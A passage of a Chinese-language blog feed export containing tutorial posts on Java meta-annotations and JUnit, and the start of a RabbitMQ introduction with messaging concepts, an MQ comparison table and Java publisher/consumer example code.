常见元注解</h4><table><thead><tr><th>注解</th><th>作用</th><th></th></tr></thead><tbody><tr><td><code>@Target</code></td><td>目标注解可以标注的位置，包括类/接口/枚举、方法、参数、构造方法、变量等位置</td><td></td></tr><tr><td><code>@Retention</code></td><td>目标注解存活时间。默认是字节码文件，表示编译成字节码之后就没有了，可取值源码、字节码、运行时</td><td></td></tr><tr><td><code>@Inherited</code></td><td>目标注解可以被继承</td><td></td></tr><tr><td><code>@Document</code></td><td>该注解参与JDKAPI文档的生成</td><td></td></tr></tbody></table><h4 id="Target"><a href="#Target" class="headerlink" title="@Target "></a><a href="/Target">@Target </a></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 常用的位置如下，在枚举ElementType中</span></span><br><span class="line"><span class="comment">// public enum ElementType &#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Class, interface (including annotation type), or enum declaration */</span></span><br><span class="line"><span class="comment">/** 类, 接口(包括注解), 或者枚举的声明上 */</span></span><br><span class="line">TYPE,</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Field declaration (includes enum constants) */</span></span><br><span class="line"><span class="comment">/** 属性 (包括枚举项)声明上 */</span></span><br><span class="line">FIELD,</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Method declaration */</span></span><br><span class="line"><span class="comment">/** 方法声明上 */</span></span><br><span class="line">METHOD,</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Formal parameter declaration */</span></span><br><span class="line"><span class="comment">/** 形参上 */</span></span><br><span class="line">PARAMETER,</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Constructor declaration */</span></span><br><span class="line"><span class="comment">/** 构造方法上 */</span></span><br><span class="line">CONSTRUCTOR,</span><br></pre></td></tr></table></figure><h4 id="Retention"><a href="#Retention" class="headerlink" title="@Retention "></a><a href="/Retention">@Retention </a></h4><p>该注解的属性值类型为<code>RetentionPolicy</code></p><p><strong>RetentionPolicy.SOURCE</strong>：注解只保留在源文件，当Java文件编译成class文件的时候，注解被遗弃；</p><p><strong>RetentionPolicy.CLASS</strong>：注解被保留到class文件，但jvm加载class文件时候被遗弃，这是默认的生命周期；</p><p><strong>RetentionPolicy.RUNTIME</strong>：注解不仅被保存到class文件中，jvm加载class文件之后，仍然存在；常用值。<br>这3个生命周期分别对应于：Java源文件(.java文件) —&gt; .class文件 —&gt; 内存中的字节码对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 表示目标注解的保留策略。</span></span><br><span class="line"><span class="comment"> * 该枚举的枚举项作为<span class="doctag">@Retention</span>注解的value属性值，确定被标注注解的保留策略/存活时间。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  Joshua Bloch</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">RetentionPolicy</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只存活在源码中，源文件中有效。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SOURCE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存活到字节码文件中，字节码中有效。默认值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    CLASS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存活到字节码对象中，运行时有效。常用值。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> java.lang.reflect.AnnotatedElement</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RUNTIME</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>演示代码</p><ul><li> 自定义注解 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.FIELD,ElementType.TYPE,ElementType.METHOD&#125;)</span>  <span class="comment">//指定注解使用的位置（成员变量，类，方法）</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="comment">//指定该注解的存活时间</span></span><br><span class="line"><span class="comment">//@Inherited //指定该注解可以被继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Anno &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 人类 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Anno</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 学生类 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;student.......show..........&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 测试类 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//获取到Student类的字节码文件对象</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;com.itheima.myanno4.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取注解。</span></span><br><span class="line">        <span class="keyword">boolean</span> result = clazz.isAnnotationPresent(Anno.class);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-Junit"><a href="#3-Junit" class="headerlink" title="3. Junit"></a>3. <code>Junit</code></h2><h3 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h3><p><code>JUnit</code>：开源的单元测试工具，提供<strong>注解</strong>识别并运行要被测试的方法。</p><h3 id="3-2-特点"><a href="#3-2-特点" class="headerlink" title="3.2 特点"></a>3.2 特点</h3><ul><li>简单优雅。直接在已有编码上测试运行即可。</li><li>结果直观。测试结果通过颜色区分（绿色成功，红色失败），原有的所有信息都可以被正常展示。</li></ul><h3 id="3-3-实现步骤"><a href="#3-3-实现步骤" class="headerlink" title="3.3 实现步骤"></a>3.3 实现步骤</h3><ol><li>导入<code>jar</code>包并添加进类库：<code>junit-4.9.jar</code></li><li>正常编写代码</li><li>在要被测试的方法上添加注解<code>@Test</code>，标注有该注解的方法就可以直接运行了，而“不依赖”<code>main</code>方法。</li></ol><h3 id="3-4-代码"><a href="#3-4-代码" class="headerlink" title="3.4 代码"></a>3.4 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JunitDemo1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// main方法用不到，可以不写</span></span><br><span class="line">    <span class="comment">/* public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="number">2</span> / <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = a + b;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-常用注解"><a href="#3-5-常用注解" class="headerlink" title="3.5 常用注解"></a>3.5 常用注解</h3><ul><li> 相关注解  <table><thead><tr><th>注解</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td><code>@Test</code></td><td>标注的目标方法为测试方法，可以直接运行测试</td><td></td></tr><tr><td><code>@Before</code></td><td>标注的目标方法在每个测试方法运行前都要运行一次</td><td></td></tr><tr><td><code>@After</code></td><td>标注的目标方法在每个测试方法运行后都要运行一次</td><td></td></tr><tr><td><code>@BeforeClass</code></td><td>标注的目标方法在当前测试类加载时被执行一次，目标方法需要<code>static</code></td><td></td></tr><tr><td>修饰</td><td></td><td></td></tr><tr><td><code>@AfterClass</code></td><td>标注的目标方法在所有测试方法执行完后被执行一次，目标方法需要<code>static</code></td><td></td></tr><tr><td>修饰</td><td></td><td></td></tr></tbody></table></li></ul><pre><code>主要用作开始测试前的准备工作和结束时的收尾工作。</code></pre><ul><li> 代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JunitDemo2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在加载类的时候执行，只会被执行一次。</span></span><br><span class="line">    <span class="comment">// 方法需要被static修饰，</span></span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beforeClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;beforeClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在销毁之前执行，只会被执行一次</span></span><br><span class="line">    <span class="comment">// 方法需要被static修饰</span></span><br><span class="line">    <span class="meta">@AfterClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">afterClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;afterClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每个测试方法执行前都会执行</span></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每个测试方法执行后都要执行</span></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;after&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-XML&quot;&gt;&lt;a href=&quot;#1-XML&quot; class=&quot;headerlink&quot; title=&quot;1. XML&quot;&gt;&lt;/a&gt;1. XML&lt;/h2&gt;&lt;h3 id=&quot;1-1-XML和properties对比&quot;&gt;&lt;a href=&quot;#1-1-XML和properties对</summary>
      
    
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/categories/Java/"/>
    
    <category term="基础" scheme="http://zephyr-cyber.github.io/categories/Java/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Java基础" scheme="http://zephyr-cyber.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="Java-基础-XML&amp;注解&amp;Junit" scheme="http://zephyr-cyber.github.io/tags/Java-%E5%9F%BA%E7%A1%80-XML-%E6%B3%A8%E8%A7%A3-Junit/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/3041119952.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/3041119952.html</id>
    <published>2022-12-12T09:43:46.000Z</published>
    <updated>2022-12-15T03:28:06.735Z</updated>
    
    <content type="html"><![CDATA[<p><a name="BB9gb"></a></p><h1 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h1><p><a name="XmLxR"></a></p><h1 id="1-初识MQ"><a href="#1-初识MQ" class="headerlink" title="1.初识MQ"></a>1.初识MQ</h1><p><a name="yOnLQ"></a></p><h2 id="1-1-同步和异步通讯"><a href="#1-1-同步和异步通讯" class="headerlink" title="1.1.同步和异步通讯"></a>1.1.同步和异步通讯</h2><p>微服务间通讯有同步和异步两种方式：<br />同步通讯：就像打电话，需要实时响应。<br />异步通讯：就像发邮件，不需要马上回复。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786612-bfe09fbc-30b0-4ba5-910b-97900e8beb5b.png#averageHue=%23578994&crop=0&crop=0&crop=1&crop=1&id=YHjCb&originHeight=605&originWidth=1495&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />两种方式各有优劣，打电话可以立即得到响应，但是你却不能跟多个人同时通话。发送邮件可以同时与多个人收发邮件，但是往往响应会有延迟。<br><a name="jd0te"></a></p><h3 id="1-1-1-同步通讯"><a href="#1-1-1-同步通讯" class="headerlink" title="1.1.1.同步通讯"></a>1.1.1.同步通讯</h3><p>之前学的Feign调用就属于同步方式，虽然调用可以实时得到结果，但存在下面的问题：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786722-2f92b8d1-d782-4fcb-84d7-9fb639ee530a.png#averageHue=%23faf7f7&crop=0&crop=0&crop=1&crop=1&id=CFRUo&originHeight=678&originWidth=1556&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />总结：<br />同步调用的优点：</p><ul><li>时效性较强，可以立即得到结果</li></ul><p>同步调用的问题：</p><ul><li><p>耦合度高</p></li><li><p>性能和吞吐能力下降</p></li><li><p>有额外的资源消耗</p></li><li><p>有级联失败问题<br><a name="deD2y"></a></p><h3 id="1-1-2-异步通讯"><a href="#1-1-2-异步通讯" class="headerlink" title="1.1.2.异步通讯"></a>1.1.2.异步通讯</h3><p>异步调用则可以避免上述问题：<br />我们以购买商品为例，用户支付后需要调用订单服务完成订单状态修改，调用物流服务，从仓库分配响应的库存并准备发货。<br />在事件模式中，支付服务是事件发布者（publisher），在支付完成后只需要发布一个支付成功的事件（event），事件中带上订单id。<br />订单服务和物流服务是事件订阅者（Consumer），订阅支付成功的事件，监听到事件后完成自己业务即可。<br />为了解除事件发布者与订阅者之间的耦合，两者并不是直接通信，而是有一个中间人（Broker）。发布者发布事件到Broker，不关心谁来订阅事件。订阅者从Broker订阅事件，不关心谁发来的消息。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786818-ba19cdaf-61ca-42b6-a40b-4eb4fd29e8de.png#averageHue=%23e6d6cc&crop=0&crop=0&crop=1&crop=1&id=f2pma&originHeight=134&originWidth=744&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />Broker 是一个像数据总线一样的东西，所有的服务要接收数据和发送数据都发到这个总线上，这个总线就像协议一样，让服务间的通讯变得标准和可控。<br />好处：</p></li><li><p>吞吐量提升：无需等待订阅者处理完成，响应更快速</p></li><li><p>故障隔离：服务没有直接调用，不存在级联失败问题</p></li><li><p>调用间没有阻塞，不会造成无效的资源占用</p></li><li><p>耦合度极低，每个服务都可以灵活插拔，可替换</p></li><li><p>流量削峰：不管发布事件的流量波动多大，都由Broker接收，订阅者可以按照自己的速度去处理事件</p></li></ul><p>缺点：</p><ul><li>架构复杂了，业务没有明显的流程线，不好管理</li><li>需要依赖于Broker的可靠、安全、性能</li></ul><p>好在现在开源软件或云平台上 Broker 的软件是非常成熟的，比较常见的一种就是我们今天要学习的MQ技术。<br><a name="W2lsn"></a></p><h2 id="1-2-技术对比："><a href="#1-2-技术对比：" class="headerlink" title="1.2.技术对比："></a>1.2.技术对比：</h2><p>MQ，中文是消息队列（MessageQueue），字面来看就是存放消息的队列。也就是事件驱动架构中的Broker。<br />比较常见的MQ实现：</p><ul><li>ActiveMQ</li><li>RabbitMQ</li><li>RocketMQ</li><li>Kafka</li></ul><p>几种常见MQ的对比：</p><table><thead><tr><th></th><th><strong>RabbitMQ</strong></th><th><strong>ActiveMQ</strong></th><th><strong>RocketMQ</strong></th><th><strong>Kafka</strong></th></tr></thead><tbody><tr><td>公司/社区</td><td>Rabbit</td><td>Apache</td><td>阿里</td><td>Apache</td></tr><tr><td>开发语言</td><td>Erlang</td><td>Java</td><td>Java</td><td>Scala&amp;Java</td></tr><tr><td>协议支持</td><td>AMQP，XMPP，SMTP，STOMP</td><td>OpenWire,STOMP，REST,XMPP,AMQP</td><td>自定义协议</td><td>自定义协议</td></tr><tr><td>可用性</td><td>高</td><td>一般</td><td>高</td><td>高</td></tr><tr><td>单机吞吐量</td><td>一般</td><td>差</td><td>高</td><td>非常高</td></tr><tr><td>消息延迟</td><td>微秒级</td><td>毫秒级</td><td>毫秒级</td><td>毫秒以内</td></tr><tr><td>消息可靠性</td><td>高</td><td>一般</td><td>高</td><td>一般</td></tr></tbody></table><p>追求可用性：Kafka、 RocketMQ 、RabbitMQ<br />追求可靠性：RabbitMQ、RocketMQ<br />追求吞吐能力：RocketMQ、Kafka<br />追求消息低延迟：RabbitMQ、Kafka<br><a name="v1IoI"></a></p><h1 id="2-入门"><a href="#2-入门" class="headerlink" title="2.入门"></a>2.入门</h1><p><a name="bjPW9"></a></p><h2 id="2-1-安装RabbitMQ"><a href="#2-1-安装RabbitMQ" class="headerlink" title="2.1.安装RabbitMQ"></a>2.1.安装RabbitMQ</h2><p>安装RabbitMQ，参考课前资料：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786900-d1c5001a-d83f-4982-9a78-1c0961aba74a.png#averageHue=%23fbf9f7&crop=0&crop=0&crop=1&crop=1&id=QLlPG&originHeight=138&originWidth=318&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />MQ的基本结构：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147786980-394cb4b6-1a99-45ee-850b-ae9b4ba24d42.png#averageHue=%23e8d7b3&crop=0&crop=0&crop=1&crop=1&id=Z7b9M&originHeight=610&originWidth=1401&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />RabbitMQ中的一些角色：</p><ul><li><p>publisher：生产者</p></li><li><p>consumer：消费者</p></li><li><p>exchange个：交换机，负责消息路由</p></li><li><p>queue：队列，存储消息</p></li><li><p>virtualHost：虚拟主机，隔离不同租户的exchange、queue、消息的隔离<br><a name="T1HjP"></a></p><h2 id="2-2-RabbitMQ消息模型"><a href="#2-2-RabbitMQ消息模型" class="headerlink" title="2.2.RabbitMQ消息模型"></a>2.2.RabbitMQ消息模型</h2><p>RabbitMQ官方提供了5个不同的Demo示例，对应了不同的消息模型：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787076-9308a9f3-2e8c-471a-87cd-766ff8f3b446.png#averageHue=%23f8f5f5&crop=0&crop=0&crop=1&crop=1&id=f2Tmk&originHeight=715&originWidth=1492&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="T4zLf"></a></p><h2 id="2-3-导入Demo工程"><a href="#2-3-导入Demo工程" class="headerlink" title="2.3.导入Demo工程"></a>2.3.导入Demo工程</h2><p>课前资料提供了一个Demo工程，mq-demo:<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787199-2013017b-c013-4ce5-b453-0c0a9e013841.png#averageHue=%23c7ad84&crop=0&crop=0&crop=1&crop=1&id=ldcHW&originHeight=112&originWidth=232&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />导入后可以看到结构如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787276-88d553b3-7a16-4531-af56-641a9f37ad2d.png#averageHue=%23eef3ed&crop=0&crop=0&crop=1&crop=1&id=cV4YR&originHeight=193&originWidth=446&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />包括三部分：</p></li><li><p>mq-demo：父工程，管理项目依赖</p></li><li><p>publisher：消息的发送者</p></li><li><p>consumer：消息的消费者<br><a name="Z2HZj"></a></p><h2 id="2-4-入门案例"><a href="#2-4-入门案例" class="headerlink" title="2.4.入门案例"></a>2.4.入门案例</h2><p>简单队列模式的模型图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787363-fed4f089-38aa-4236-8c22-9f304e67805b.png#averageHue=%23f6f3eb&crop=0&crop=0&crop=1&crop=1&id=J3t1L&originHeight=215&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />官方的HelloWorld是基于最基础的消息队列模型来实现的，只包括三个角色：</p></li><li><p>publisher：消息发布者，将消息发送到队列queue</p></li><li><p>queue：消息队列，负责接受并缓存消息</p></li><li><p>consumer：订阅队列，处理队列中的消息<br><a name="n0JyN"></a></p><h3 id="2-4-1-publisher实现"><a href="#2-4-1-publisher实现" class="headerlink" title="2.4.1.publisher实现"></a>2.4.1.publisher实现</h3><p>思路：</p></li><li><p>建立连接</p></li><li><p>创建Channel</p></li><li><p>声明队列</p></li><li><p>发送消息</p></li><li><p>关闭连接和channel</p></li></ul><p>代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.helloworld;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Channel;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.Connection;</span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeoutException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PublisherTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendMessage</span><span class="params">()</span> <span class="keyword">throws</span> IOException, TimeoutException </span>&#123;</span><br><span class="line">        <span class="comment">// 1.建立连接</span></span><br><span class="line">        ConnectionFactory factory = <span class="keyword">new</span> ConnectionFactory();</span><br><span class="line">        <span class="comment">// 1.1.设置连接参数，分别是：主机名、端口号、vhost、用户名、密码</span></span><br><span class="line">        factory.setHost(<span class="string">&quot;192.168.150.101&quot;</span>);</span><br><span class="line">        factory.setPort(<span class="number">5672</span>);</span><br><span class="line">        factory.setVirtualHost(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        factory.setUsername(<span class="string">&quot;itcast&quot;</span>);</span><br><span class="line">        factory.setPassword(<span class="string">&quot;123321&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.2.建立连接</span></span><br><span class="line">        Connection connection = factory.newConnection();</span><br><span class="line">        <span class="comment">// 2.创建通道Channel</span></span><br><span class="line">        Channel channel = connection.createChannel();</span><br><span class="line">        <span class="comment">// 3.创建队列</span></span><br><span class="line">        String queueName = <span class="string">&quot;simple.queue&quot;</span>;</span><br><span class="line">        channel.queueDeclare(queueName, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 4.发送消息</span></span><br><span class="line">        String message = <span class="string">&quot;hello, rabbitmq!&quot;</span>;</span><br><span class="line">        channel.basicPublish(<span class="string">&quot;&quot;</span>, queueName, <span class="keyword">null</span>, message.getBytes());</span><br><span class="line">        System.out.println(<span class="string">&quot;发送消息成功：【&quot;</span> + message + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">        <span class="comment">// 5.关闭通道和连接</span></span><br><span class="line">        channel.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="bEghi"></a></p><h3 id="2-4-2-consumer实现"><a href="#2-4-2-consumer实现" class="headerlink" title="2.4.2.consumer实现"></a>2.4.2.consumer实现</h3><p>代码思路：</p><ul><li>建立连接</li><li>创建Channel</li><li>声明队列</li><li>订阅消息</li></ul><p>代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 